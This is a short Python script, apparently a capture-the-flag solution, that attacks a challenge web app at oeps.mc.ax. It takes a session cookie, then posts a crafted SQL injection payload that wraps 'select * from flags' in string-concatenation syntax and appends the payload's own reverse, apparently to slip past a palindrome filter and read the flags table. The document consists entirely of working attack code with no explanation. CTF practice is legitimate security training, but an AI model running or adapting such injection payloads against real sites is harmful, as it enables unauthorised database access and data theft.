import requests

URL = "https://oeps.mc.ax"


class exploit:
    def __init__(self, query=None, url=None, params=None, cookie=None):
        self.session = requests.Session()
        if url:
            self.url = url
        else:
            raise Exception("url is required")
        if params:
            self.params = params
        if cookie:
            self.session.cookies = cookie
        if query:
            self.forged_query = self.forged_sqli(query)

    def forged_sqli(self, query):
        query = "%'||("+query+")||'%') -- - "
        query = query + query[::-1]
        return query
    
    def get_cookie(self):
        return self.session.get(self.url).cookies
        
    def send_query(self):
        return self.session.post(self.url,
                                 data={self.params: self.forged_query})

cookie = exploit(url=URL).get_cookie()

r = exploit(query="select * from flags", url=URL+"/submit", params="submission", cookie=cookie).send_query()
print(r.text)
